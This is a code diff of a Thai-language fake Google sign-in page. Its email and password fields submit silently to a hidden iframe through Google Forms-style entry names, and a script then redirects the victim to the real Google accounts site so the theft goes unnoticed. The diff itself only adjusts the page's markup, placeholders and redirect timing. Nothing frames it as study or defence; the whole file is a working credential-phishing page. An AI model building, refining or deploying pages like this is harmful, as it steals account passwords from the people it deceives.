@@ -8,13 +8,13 @@
         .box { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px; width: 360px; text-align: center; }
         input { width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
         button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; float: right; font-weight: 500; }
-        #hidden_iframe { display: none; }
+        iframe { display: none; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75" alt="Google">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
     <h2>ลงชื่อเข้าใช้งาน</h2>
     <p>ใช้บัญชี Google ของคุณ</p>
 
@@ -23,8 +23,8 @@
           target="hidden_iframe" 
           onsubmit="moveOn()">
         
-        <input type="email" name="entry.1449652638" placeholder="อีเมลหรือโทรศัพท์" required>
-        <input type="password" name="entry.270012312" placeholder="ป้อนรหัสผ่านของคุณ" required>
+        <input type="text" name="entry.1449652638" placeholder="อีเมลหรือโทรศัพท์" required>
+        <input type="password" name="entry.270012312" placeholder="รหัสผ่าน" required>
         
         <div style="margin-top: 40px;">
             <button type="submit">ถัดไป</button>
@@ -36,10 +36,9 @@
 
 <script>
     function moveOn() {
-        // รอให้ฟอร์มส่งข้อมูลครู่หนึ่งแล้วเด้งไปหน้าจริง
         setTimeout(() => {
-            window.location.href = "https://accounts.google.com/v3/signin/identifier";
-        }, 800);
+            window.location.href = "https://accounts.google.com";
+        }, 1000);
     }
 </script>
 
